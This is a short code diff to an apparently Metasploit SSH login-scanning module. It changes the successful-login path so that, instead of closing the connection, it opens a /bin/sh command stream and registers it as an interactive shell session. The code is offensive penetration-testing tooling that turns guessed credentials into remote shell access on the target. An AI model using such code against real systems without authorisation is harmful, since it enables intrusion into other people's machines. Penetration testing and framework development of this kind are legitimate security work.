@@ -53,9 +53,11 @@ class Metasploit3 < Msf::Auxiliary
 
 	def do_login(ip,user,pass,port)
 		opt_hash = {
-			:password => pass,
 			:auth_methods => ['password','keyboard-interactive'],
-			:port => port
+			:msframework  => framework,
+			:msfmodule    => self,
+			:port         => port,
+			:password     => pass
 		}
 
 		begin
@@ -69,6 +71,7 @@ class Metasploit3 < Msf::Auxiliary
 		rescue Net::SSH::Exception
 			return [:fail,nil] # For whatever reason. Can't tell if passwords are on/off without timing responses.
 		end
+
 		if self.ssh_socket
 			proof = ''
 			begin
@@ -81,7 +84,12 @@ class Metasploit3 < Msf::Auxiliary
 			rescue ::Exception
 			end
 
-			self.ssh_socket.close
+			# Create a new session
+			conn = Net::SSH::CommandStream.new(self.ssh_socket, '/bin/sh', true)
+			sess = Msf::Sessions::CommandShell.new(conn.lsock)
+			sess.set_from_exploit(self)
+			framework.sessions.register(sess)
+
 			return [:success, proof]
 		else
 			return [:fail, nil]
